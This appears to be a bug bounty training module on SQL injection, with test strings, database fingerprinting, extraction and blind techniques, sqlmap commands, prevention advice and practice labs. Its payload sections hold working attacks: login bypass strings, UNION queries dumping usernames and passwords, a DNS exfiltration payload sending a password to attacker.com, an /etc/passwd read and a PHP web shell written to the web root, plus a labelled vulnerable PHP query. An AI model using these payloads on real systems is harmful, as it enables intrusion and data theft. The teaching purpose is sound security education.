# 💉 Module 05: SQL Injection

> **Level:** 🟡 Intermediate | **Time:** ~4 hours | **Prerequisites:** Module 01-04

---

## 📖 Overview

SQL Injection (SQLi) is one of the most critical and consistently rewarded vulnerabilities in bug bounty programs. It occurs when user input is incorporated into SQL queries without proper sanitization, allowing attackers to manipulate database queries, extract data, bypass authentication, and sometimes gain server access.

---

## ❓ Why It Matters

SQLi vulnerabilities have led to some of the largest data breaches in history — from LinkedIn to Sony to Yahoo. A single SQLi in a bug bounty program can earn **$5,000 to $30,000+** depending on data sensitivity and program.

---

## 🌍 Real-World Example

A researcher found a blind SQL injection in a major e-commerce platform's product search parameter. By using time-based techniques, they confirmed the injection and extracted the admin credentials hash, earning a **$10,000 critical bounty**. The vulnerable code was:

```php
// VULNERABLE CODE (never do this)
$query = "SELECT * FROM products WHERE category='" . $_GET['category'] . "'";
```

---

## 📋 Step-by-Step Methodology

### Step 1: Find Injection Points

```
Look for parameters that interact with a database:
- URL parameters: ?id=1, ?category=electronics
- Form fields: login forms, search boxes, registration
- HTTP headers: User-Agent, X-Forwarded-For, Cookie
- JSON/XML body parameters in APIs
```

### Step 2: Test for SQLi

```sql
-- Basic string terminators
'
"
`
')
")
--
#
/*

-- Confirm injection with simple tests
' OR '1'='1
' AND '1'='2
1 OR 1=1
1 AND 1=2
```

### Step 3: Determine Database Type

```sql
-- MySQL
' AND SLEEP(3)-- -          (time-based)
' AND 1=1-- -               (boolean)
VERSION()                   (MySQL function)

-- MSSQL
'; WAITFOR DELAY '0:0:3'-- 
@@VERSION

-- Oracle
' AND 1=1--
SELECT banner FROM v$version

-- PostgreSQL  
'; SELECT pg_sleep(3)--
version()
```

### Step 4: Extract Data

```sql
-- UNION-based extraction (need to know column count first)
-- Find column count:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (error means 2 columns)

-- Find displayable columns:
' UNION SELECT NULL,NULL--
' UNION SELECT 'a','b'--

-- Extract database name:
' UNION SELECT database(),NULL--

-- Extract tables:
' UNION SELECT table_name,NULL FROM information_schema.tables 
  WHERE table_schema=database()--

-- Extract columns:
' UNION SELECT column_name,NULL FROM information_schema.columns 
  WHERE table_name='users'--

-- Extract data:
' UNION SELECT username,password FROM users--
```

### Step 5: Blind SQLi Techniques

```sql
-- Boolean-based blind
-- If true: normal response; If false: different response
' AND 1=1-- -   (true)
' AND 1=2-- -   (false)

-- Extract data character by character
' AND SUBSTRING(username,1,1)='a'-- -
' AND ASCII(SUBSTRING(password,1,1))>100-- -

-- Time-based blind (no visual difference in responses)
' AND SLEEP(3)-- -                     (MySQL)
'; IF(1=1) WAITFOR DELAY '0:0:3'--    (MSSQL)
' AND 1=(SELECT 1 FROM pg_sleep(3))-- (PostgreSQL)
```

---

## 🛠️ Tools Used

| Tool | Purpose | Command |
|------|---------|---------|
| **sqlmap** | Automated SQLi detection & exploitation | `sqlmap -u "URL" --dbs` |
| **Burp Suite** | Manual testing, intruder | GUI tool |
| **Havij** | Automated SQLi (Windows) | GUI tool |

---

## 💡 Payload Examples

### Authentication Bypass

```sql
-- Login bypass payloads
admin'--
admin'#
admin'/*
' OR '1'='1
' OR 1=1--
" OR "1"="1
') OR ('1'='1
```

### sqlmap Usage

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# Test POST parameter
sqlmap -u "http://target.com/login" --data="user=test&pass=test" -p user

# Extract all databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Extract tables from database
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Extract data from table
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# Use session cookies
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Use HTTP request file (from Burp)
sqlmap -r request.txt --dbs

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,randomcase
```

### Advanced Payloads

```sql
-- Stacked queries (if supported)
'; INSERT INTO users VALUES ('hacker','pass123')--

-- Out-of-band extraction (DNS)
'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\x'))--

-- File read (MySQL with privileges)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--

-- File write (MySQL with FILE privilege)  
' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL 
  INTO OUTFILE '/var/www/html/shell.php'--
```

---

## 🛡️ Prevention

| Prevention | Implementation |
|-----------|---------------|
| **Parameterized queries** | `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?")` |
| **ORM/prepared statements** | Use frameworks that handle queries safely |
| **Input validation** | Whitelist expected data types |
| **WAF** | Web Application Firewall as additional layer |
| **Least privilege** | DB user should only have needed permissions |
| **Error handling** | Never expose database errors to users |

```python
# SECURE CODE - Parameterized query
import sqlite3
conn = sqlite3.connect('database.db')
cursor = conn.cursor()

# Safe - user input is a parameter, not part of the query
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))

# Also safe in Python with named parameters
cursor.execute("SELECT * FROM users WHERE username = :username", 
               {"username": username})
```

---

## 🧪 Practice Labs

| Lab | Link | Exercise |
|-----|------|---------|
| PortSwigger SQLi Labs | [portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection) | 18 progressive labs |
| DVWA | localhost | SQL Injection module (Low/Med/High) |
| HackTheBox | [hackthebox.com](https://hackthebox.com) | SQLi challenges |
| TryHackMe SQLi Room | [tryhackme.com](https://tryhackme.com) | SQL Injection room |

---

## 📚 Additional Reading

- [Advanced SQLi Techniques](./advanced-sqli.md) — Blind, OOB, and WAF bypass
- [SQLi Prevention Guide](./prevention.md) — Secure coding practices

---

<div align="center">

[← Module 04: Introduction to Web](../04.%20Introduction%20to%20Web/README.md) | [Next Module: Web Application Basics →](../06.%20Web%20Application%20Basics/README.md)

</div>
